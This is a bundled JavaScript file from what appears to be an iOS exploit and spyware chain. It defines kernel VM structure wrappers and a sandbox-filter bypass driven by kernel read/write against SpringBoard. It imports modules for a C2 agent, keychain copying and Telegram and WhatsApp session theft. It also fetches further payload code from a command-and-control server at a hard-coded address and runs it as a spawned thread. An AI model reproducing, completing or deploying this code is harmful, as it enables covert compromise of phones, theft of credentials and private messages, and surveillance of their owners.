		//console.log(TAG,`After write zone element`);
		//let mappedAddr = Native.callSymbol("malloc",roundedSize * 4n);
		//let mappedAddr = new_bigint();
		let mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(mappedAddr, 0x1337n);
		//let mach_vm_map_func = Native.dlsym("mach_vm_map");
		//console.log(TAG,`mach_vm_map:${Utils.hex(mach_vm_map_func)} with object.entryOffset:${Utils.hex(object.entryOffset)}`);
		//ret = fcall(mach_vm_map_func,0x203n,get_bigint_addr(mappedAddr),0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_map",0x203n,mappedAddr,0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		//console.log(TAG,`ret:${ret}`);
		mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(mappedAddr);
		//console.log(TAG,`mach_vm_map():${Utils.hex(ret)}, mappedAddr=${Utils.hex(mappedAddr)}`);
		if(ret != 0)
		{
			console.log(TAG,'failed on mach_vm_map');
			mappedAddr = 0n;
		}

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_deallocate", 0x203, localAddr, roundedSize);
		if (ret != 0) {
			console.log(TAG, "mach_vm_deallocate: " + ret);
		}

		//let mappedAddr = Native.callSymbol("wrapper_mach_vm_map",port,object.entryOffset);
		//console.log(TAG,`mappedAddr:${Utils.hex(mappedAddr)}`);
		shmem.port = BigInt(port);
		shmem.remoteAddress = object.vmAddress;
		shmem.localAddress = mappedAddr;
		return shmem;
	}
	
	static mocker(addrUnpack,addrPack)
	{
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(addrUnpack, params);
		//console.log(TAG,`vmeObjectUnpack:${Utils.hex(vmeObject)}`);
		vmeObject = this.#VM_PACK_POINTER(addrPack,params);
		//console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/VMObject.js":
/*!**************************************!*\
  !*** ./src/libs/TaskRop/VMObject.js ***!
  \**************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VMObject)
/* harmony export */ });
class VMObject
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get vmAddress()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set vmAddress(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get address()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set address(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get objectOffset()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set objectOffset(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
	get entryOffset()
	{
		return this.#dataView.getBigUint64(24,true);
	}
	set entryOffset(value)
	{
		this.#dataView.setBigUint64(24,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VMShmem.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/VMShmem.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VMShmem)
/* harmony export */ });
class VMShmem 
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get port()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set port(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get remoteAddress()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set remoteAddress(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get localAddress()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set localAddress(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VmMapEntry.js":
/*!****************************************!*\
  !*** ./src/libs/TaskRop/VmMapEntry.js ***!
  \****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__),
/* harmony export */   vm_map_entry: () => (/* binding */ vm_map_entry),
/* harmony export */   vm_map_links: () => (/* binding */ vm_map_links)
/* harmony export */ });
class vm_map_links {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x20);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
    /* previous entry */
    get prev() { return this.#__view.getBigUint64(this.#__off, true); }
    set prev(val) { this.#__view.setBigUint64(this.#__off, val, true); }
    /* next entry */
    get next() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
    set next(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
    /* start address */
    get start() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
    set start(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
    /* end address */
    get end() { return this.#__view.getBigUint64(this.#__off+0x18, true); }
    set end(val) { this.#__view.setBigUint64(this.#__off+0x18, val, true); }
};

class vm_map_store {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x18);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
    /* left element */
    get rbe_left() { return this.#__view.getBigUint64(this.#__off, true); }
    set rbe_left(val) { this.#__view.setBigUint64(this.#__off, val, true); }
    /* right element */
    get rbe_right() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
    set rbe_right(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
    /* parent element */
    get rbe_parent() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
    set rbe_parent(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
};

class vm_map_entry {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x50);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
        this.links = new vm_map_links(this.#__mem, this.#__off);
        this.store = new vm_map_store(this.#__mem, this.#__off+0x20);
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }

    // Union field 1
    get vme_object_value() { return this.#__view.getBigUint64(this.#__off+0x38, true); }
    set vme_object_value(val) { this.#__view.setBigUint64(this.#__off+0x38, val, true); }

    // Union field 2
    get vme_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
    set vme_atomic(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
        this.#__view.setUint8(this.#__off+0x38, cur + (val & 1), true);
    }
    get is_sub_map() { return (this.#__view.getUint8(this.#__off+0x38, true) & 2) >> 1; }
    set is_sub_map(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfd;
        this.#__view.setUint8(this.#__off+0x38, cur + ((val & 1) << 1), true);
    }
    get vme_submap() { return this.#__view.getBigUint64(this.#__off+0x38, true) >> 2n; }
    set vme_submap(val) {
        let cur = this.#__view.getBigUint64(this.#__off+0x38, true) & 3n;
        this.#__view.setBigUint64(this.#__off+0x38, cur + ((val & 0x3fffffffffffffffn) << 2n), true);
    }

    // Union field 3
    get vme_ctx_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
    set vme_ctx_atomic(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
        this.#__view.setUint8(this.#__off+0x38, cur + (val & 1), true);
    }
    get vme_ctx_is_sub_map() { return (this.#__view.getUint8(this.#__off+0x38, true) & 2) >> 1; }
    set vme_ctx_is_sub_map(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfd;
        this.#__view.setUint8(this.#__off+0x38, cur + ((val & 1) << 1), true);
    }
    get vme_context() { return this.#__view.getUint32(this.#__off+0x38, true) >> 2; }
    set vme_context(val) {
        let cur = this.#__view.getUint32(this.#__off+0x38, true) & 2;
        this.#__view.setUint32(this.#__off+0x38, cur + (val << 2), true);
    }
    get vme_object() { return this.#__view.getUint32(this.#__off+0x3c, true); }
    set vme_object(val) { this.#__view.setUint32(this.#__off+0x3c, val, true); }

    // vme_alias:12,               /* entry VM tag */
    // vme_offset:52,              /* offset into object */
    get vme_offset() { return this.#__view.getBigUint64(this.#__off+0x40, true) >> 12n;  }
    set vme_offset(val) {
        let cur = this.#__view.getBigUint64(this.#__off+0x40, true) & 0xfffn;
        this.#__view.setBigUint64(this.#__off+0x40, cur + (val << 12n), true);
    }
    // is_shared:1,                /* region is shared */
    // __unused1:1,
    // in_transition:1,            /* Entry being changed */
    // needs_wakeup:1,             /* Waiters on in_transition */
    // behavior:2,                 /* user paging behavior hint */
    // needs_copy:1,               /* object need to be copied? */
    // protection:3,               /* protection code */
    // used_for_tpro:1,
    // max_protection:4,           /* maximum protection, bit3=UEXEC */
    // inheritance:2,              /* inheritance */
    // use_pmap:1,
    // no_cache:1,                 /* should new pages be cached? */
    // vme_permanent:1,            /* mapping can not be removed */
    // superpage_size:1,           /* use superpages of a certain size */
    // map_aligned:1,              /* align to map's page size */
    // zero_wired_pages:1,
    // used_for_jit:1,
    // csm_associated:1,           /* code signing monitor will validate */
    // iokit_acct:1,
    // vme_resilient_codesign:1,
    // vme_resilient_media:1,
    // vme_xnu_user_debug:1,
    // vme_no_copy_on_read:1,
    // translated_allow_execute:1, /* execute in translated processes */
    // vme_kernel_object:1;        /* vme_object is kernel_object */

    /* can be paged if = 0 */
    get wired_count() { return this.#__view.getUint16(this.#__off+0x4c, true); }
    set wired_count(val) { this.#__view.setUint16(this.#__off+0x4c, val, true); }
    /* for vm_wire */
    get user_wired_count() { return this.#__view.getUint16(this.#__off+0x4e, true); }
    set user_wired_count(val) { this.#__view.setUint16(this.#__off+0x4e, val, true); }
};
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ({vm_map_entry,vm_map_links,vm_map_store});


/***/ }),

/***/ "./src/libs/TaskRop/VmPackingParams.js":
/*!*********************************************!*\
  !*** ./src/libs/TaskRop/VmPackingParams.js ***!
  \*********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VmPackingParams)
/* harmony export */ });
class VmPackingParams
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get vmpp_base()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set vmpp_base(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get vmpp_bits()
	{
		return this.#dataView.getUint8(8,true);
	}
	set vmpp_bits(value)
	{
		this.#dataView.setUint8(8,value,true);
	}
	get vmpp_shift()
	{
		return this.#dataView.getUint8(9,true);
	}
	set vmpp_shift(value)
	{
		this.#dataView.setUint8(9,value,true);
	}
	get vmpp_base_relative()
	{
		return this.#dataView.getUint8(10,true);
	}
	set vmpp_base_relative(value)
	{
		this.#dataView.setUint8(10,value,true);
	}
}

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry needs to be wrapped in an IIFE because it needs to be isolated against other modules in the chunk.
(() => {
/*!*********************!*\
  !*** ./src/main.js ***!
  \*********************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ "./src/libs/TaskRop/TaskRop.js");
/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/Sandbox */ "./src/libs/TaskRop/Sandbox.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./InjectJS */ "./src/InjectJS.js");
/* harmony import */ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/Driver */ "./src/libs/Driver/Driver.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! !raw-loader!../dist/MigFilterBypassThread.js */ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js");
/* harmony import */ var _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! !raw-loader!loader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js");

/* harmony import */ var _raw_loader_c2_agent_js__WEBPACK_IMPORTED_MODULE_17__ = __webpack_require__(/*! !raw-loader!c2_agent.js */ "./node_modules/raw-loader/dist/cjs.js!./src/c2_agent.js");
/* harmony import */ var _raw_loader_session_telegram_js__WEBPACK_IMPORTED_MODULE_24__ = __webpack_require__(/*! !raw-loader!session_telegram.js */ "./node_modules/raw-loader/dist/cjs.js!./src/session_telegram.js");
/* harmony import */ var _raw_loader_session_whatsapp_js__WEBPACK_IMPORTED_MODULE_23__ = __webpack_require__(/*! !raw-loader!session_whatsapp.js */ "./node_modules/raw-loader/dist/cjs.js!./src/session_whatsapp.js");
/* harmony import */ var _raw_loader_session_probe_js__WEBPACK_IMPORTED_MODULE_22__ = __webpack_require__(/*! !raw-loader!session_probe.js */ "./node_modules/raw-loader/dist/cjs.js!./src/session_probe.js");
/* harmony import */ var _raw_loader_c2_mem_loader_js__WEBPACK_IMPORTED_MODULE_19__ = __webpack_require__(/*! !raw-loader!c2_mem_loader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/c2_mem_loader.js");
/* harmony import */ var _raw_loader_c2_bootstrap_js__WEBPACK_IMPORTED_MODULE_18__ = __webpack_require__(/*! !raw-loader!c2_bootstrap.js */ "./node_modules/raw-loader/dist/cjs.js!./src/c2_bootstrap.js");
/* harmony import */ var _raw_loader_c2_probe_js__WEBPACK_IMPORTED_MODULE_21__ = __webpack_require__(/*! !raw-loader!c2_probe.js */ "./node_modules/raw-loader/dist/cjs.js!./src/c2_probe.js");
/* harmony import */ var _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__ = __webpack_require__(/*! !raw-loader!keychain_copier.js */ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js");


class MigFilterBypass {

	#running;
	#sharedMem;
	#runFlagPtr;
	#isRunningPtr;
	#monitorThread1Ptr;
	#monitorThread2Ptr;
	#mutexPtr;

	constructor(mutexPtr) {
		this.#mutexPtr = mutexPtr;
		this.#running = false;
		this.#sharedMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x100));
		this.#runFlagPtr = this.#sharedMem;
		this.#isRunningPtr = this.#sharedMem + 0x4n;
		this.#monitorThread1Ptr = this.#sharedMem + 0x8n;
		this.#monitorThread2Ptr = this.#sharedMem + 0x10n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#isRunningPtr, 0);
	}

	start() {
		if (this.#running)
			return;

		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_thread_self"));
		let threadSelfAddr = BigInt(libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf));


		let threadMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x400));
		let kernelRW = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].transferRW();
		let kernelBase = BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].getKernelBase());
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem, BigInt(kernelRW.controlSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x10n, kernelBase);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x18n, threadSelfAddr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x20n, this.#runFlagPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x28n, this.#isRunningPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x30n, this.#mutexPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x38n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migLock));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x40n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migSbxMsg));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x48n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migKernelStackLR));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x50n, this.#monitorThread1Ptr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x58n, this.#monitorThread2Ptr);
		//Native.write64(threadMem, lock.kernelSlide);
		//Native.write64(threadMem + 0x8n, lock.lockAddr);
		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
		function peResolveMigThreadCode(forceNet) {
			let pname = "MigFilterBypassThread.js";
			try {
				if (!forceNet && globalThis.__pe_mig_thread_src && String(globalThis.__pe_mig_thread_src).length > 2000) {
					return String(globalThis.__pe_mig_thread_src);
				}
			} catch (_) {}
			let emb = "";
			try {
				emb = String(_raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"] || "");
			} catch (_) { emb = ""; }
			if (emb.length > 2000 && emb.indexOf("MigFilterBypassThread omitted") < 0) {
				globalThis.__pe_mig_thread_src = emb;
				try { (globalThis.__peCacheWrite || __peCacheWrite)(pname, emb); } catch (_) {}
				return emb;
			}
			if (!forceNet) {
				try {
					let disk = (globalThis.__peCacheRead || __peCacheRead)(pname, 2000);
					if (disk && disk.indexOf("MigFilterBypassThread omitted") < 0) {
						globalThis.__pe_mig_thread_src = disk;
						LOG("[PE] mig thread disk-cache hit len=" + disk.length);
						return disk;
					}
				} catch (_) {}
			}
			LOG("[PE] mig thread fetch begin /api/payload/get emb_len=" + emb.length);
			let idn = (typeof pePayloadIdentity === "function" ? pePayloadIdentity : globalThis.pePayloadIdentity)();
			let httpPost = typeof __peHttpPostJson === "function" ? __peHttpPostJson : globalThis.__peHttpPostJson;
			if (typeof httpPost !== "function") {
				LOG("[PE] mig thread fetch FAIL no __peHttpPostJson");
				return emb || "";
			}
			let resp = httpPost("/api/payload/get", JSON.stringify({
				name: pname,
				uid: idn.uid,
				uuid: idn.uuid,
				device_code: idn.device_code || idn.uuid
			}));
			if (!resp || resp.length < 100) {
				LOG("[PE] mig thread fetch empty resp_len=" + (resp ? resp.length : 0));
			} else {
				let obj = null;
				try { obj = JSON.parse(resp); } catch (e) {
					LOG("[PE] mig thread fetch JSON fail: " + e);
					obj = null;
				}
				let src = (typeof __pePayloadSrcFromResp === "function" ? __pePayloadSrcFromResp(obj) : ((obj && obj.src) ? String(obj.src) : ""));
				if (src.length >= 2000 && src.indexOf("MigFilterBypassThread omitted") < 0) {
					try {
						(globalThis.__peCacheWrite || __peCacheWrite)(pname, src, {
							sha256: obj && obj.sha256,
							size: obj && obj.size
						});
					} catch (_) {}
					globalThis.__pe_mig_thread_src = src;
					LOG("[PE] mig thread fetch ok len=" + src.length + " disk=1");
					return src;
				}
				LOG("[PE] mig thread fetch short len=" + src.length + " ok=" + (obj && obj.ok));
			}
			// Static 8083 fallback (same host as C2, exploit static root).
			try {
				let httpGet = typeof __peHttpGetRaw === "function" ? __peHttpGetRaw : globalThis.__peHttpGetRaw;
				let host = (typeof PELOG_HOST !== "undefined" ? PELOG_HOST : "192.168.31.32");
				if (typeof httpGet === "function") {
					let staticSrc = httpGet(host, (typeof PE_V1_STATIC_PORT !== "undefined" ? PE_V1_STATIC_PORT : 8083), "/" + pname);
					if (staticSrc && staticSrc.length >= 2000 &&
						staticSrc.indexOf("MigFilterBypassThread omitted") < 0) {
						globalThis.__pe_mig_thread_src = staticSrc;
						try { (globalThis.__peCacheWrite || __peCacheWrite)(pname, staticSrc); } catch (_) {}
						LOG("[PE] mig thread static-8083 ok len=" + staticSrc.length);
						return staticSrc;
					}
					LOG("[PE] mig thread static-8083 miss len=" + (staticSrc ? staticSrc.length : 0));
				}
			} catch (stE) {
				LOG("[PE] mig thread static-8083 err: " + stE);
			}
			return emb || "";
		}
		let migSrc = peResolveMigThreadCode(false);
		if (!migSrc || migSrc.length < 2000 || migSrc.indexOf("MigFilterBypassThread omitted") >= 0) {
			LOG("[PE] mig thread resolve retry forceNet");
			migSrc = peResolveMigThreadCode(true);
		}
		if (!migSrc || migSrc.length < 2000 || migSrc.indexOf("MigFilterBypassThread omitted") >= 0) {
			LOG("[PE] mig thread resolve FAIL len=" + (migSrc ? migSrc.length : 0));
			return;
		}
		const threadCode = "fcall_init(); " + migSrc;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);

		let sawRunning = false;
		for (let i=0; i<10; i++) {
			let isRunning = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(this.#isRunningPtr);
			if (isRunning) {
				sawRunning = true;
				break;
			}
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
		}
		if (!sawRunning) {
			LOG("[PE] mig thread spawned but isRunning=0 after 5s");
			return;
		}

		this.#running = true;
		LOG("[PE] mig bypass thread running");
	}

	ready() {
		return !!this.#running;
	}

	stop() {
		if (!this.#running)
			return;

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 0);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
		this.#running = false;
	}

	pause() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	resume() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	monitorThreads(thread1, thread2) {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread1Ptr, thread1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread2Ptr, thread2);
	}
}
function xnuVersion() {
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("uname", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem);
	const release = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x200n, 0x100);
	let splittedVersion = release.split(".");
	let xnuMajor = splittedVersion[0];
	let xnuMinor = splittedVersion[1];
	return {major: xnuMajor, minor: xnuMinor};
}

const TAG = "MAIN";
//const targetProcess = "bluetoothd";
const targetProcess = "SpringBoard";
function start() {
	LOG("[PE-MAIN] start() entered");
	// Hard stop: second start() in same process (Safari reload) must NOT re-runPE / launchd.
	if (globalThis.__pe_main_started || globalThis.__pe_listen_loop_active) {
		LOG("[PE-MAIN] start() ABORT reentry started=" + !!globalThis.__pe_main_started +
			" listen=" + !!globalThis.__pe_listen_loop_active + " pid=" + fcall(GETPID));
		return;
	}
	// CorePayload-style singleton: grab pe.lock BEFORE runPE (listen used to acquire too late).
	try {
		let lkEarly = (typeof __peTryAcquireListenLock === "function"
			? __peTryAcquireListenLock
			: globalThis.__peTryAcquireListenLock)();
		if (lkEarly && lkEarly.ok === false) {
			LOG("[PE-MAIN] start() ABORT pe.lock live holder=" + lkEarly.holder +
				" my=" + lkEarly.pid + " err=" + (lkEarly.error || "held") +
				" (refuse second PE/runPE)");
			return;
		}
		if (lkEarly && lkEarly.stole)
			LOG("[PE-MAIN] pe.lock stole stale pid=" + lkEarly.stale + " early");
		else
			LOG("[PE-MAIN] pe.lock acquired early pid=" + Number(fcall(GETPID)));
	} catch (lkE) {
		LOG("[PE-MAIN] pe.lock early warn: " + String(lkE).slice(0, 80));
	}
	globalThis.__pe_main_started = true;
	let mutexPtr = null;
	let migFilterBypass = null;
	globalThis.xnuVersion = xnuVersion();
	let ver = globalThis.xnuVersion;

	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
	if (ver.major == 24 && ver.minor >= 4) {

		mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
